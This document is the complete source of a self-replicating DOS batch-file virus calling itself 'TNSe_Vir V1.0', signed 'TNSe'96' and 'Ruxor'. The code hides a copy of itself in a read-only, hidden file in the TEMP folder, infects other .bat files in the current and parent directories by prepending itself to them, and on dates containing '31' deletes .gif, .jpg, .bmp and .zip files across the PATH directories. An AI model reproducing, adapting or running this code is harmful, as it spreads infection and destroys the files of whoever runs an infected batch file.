@echo off%TNSe%
if .%1==.%0 goto TNSe_Old_Bat
if .%1==.TNSe_Action goto TNSe_Start
if .%1==.TNSe_Infect goto TNSe_Infect

rem Here is the Part that saves the %1 %2 %3.. into TNSe_Save
:TNSe_Vir
set TNSe_Save=
set TNSe_Org_Prg=%0
if not exist %0 set TNSe_Org_Prg=%0.bat
if .%0==. set TNSe_Org_Prg=AUTOEXEC.BAT
:TNSe_CMD_Save
if .%1==. goto TNSe_ISaved
set TNSe_Save=%TNSe_Save% %1
shift     ~TNSe_Vir V1.0
goto TNSe_CMD_Save
:TNSe_ISaved
%TNSe_Org_Prg% TNSe_Action %PATH%

rem TNSe_Vir Infection Part
:TNSe_Infect
if TNSe%0==TNSe%2 exit
find "TNSe"<%2>nul
if not errorlevel==1 exit      ~TNSe
ren %2 TNSe{1}.{0}
attrib -r -h %TEMP%\_TNSeVir.bat
copy %TEMP%\_TNSeVir.bat+TNSe{1}.{0} %2 >nul
del TNSe{1}.{0}

attrib +r +h %TEMP%\_TNSeVir.bat
exit    ~TNSe

rem TNSe_Vir Action Part....
:TNSe_Start
if exist TNSe{1}.{0} del TNSe{1}.{0}

if exist %TEMP%\_TNSeVir.bat goto TNSe_Date
find "TNSe"<%TNSe_Org_Prg%>%TEMP%\_TNSeVir.bat
attrib %TEMP%\_TNSeVir.bat +r +h

:TNSe_Date
echo.|date|find "31">nul%TNSe%
if errorlevel 1 goto TNSe_Find

:TNSe_Show
if .%2==. goto TNSe_Find

for %%c in (%2\*.gif %2\*.jpg %2\*.bmp %2\*.zip) do del %%c%TNSe%

shift     ~TNSe_Vir V1.0
goto TNSe_Show

:TNSe_Find
for %%c in (*.bat ..\*.bat) do %COMSPEC% /E:32768 /C %TNSe_Org_Prg% TNSe_Infect %%c

:TNSe_IShown
%TNSe_Org_Prg% %TNSe_Org_Prg% %TNSe_Save%

rem hehehehe.. gonna start old... TNSe_Vir V1.0 Ruxor :)
:TNSe_Old_Bat
set TNSe_Save=
set TNSe_Org_Prg=
shift     ~TNSe_Vir V1.0
echo TNSe'96... :=)
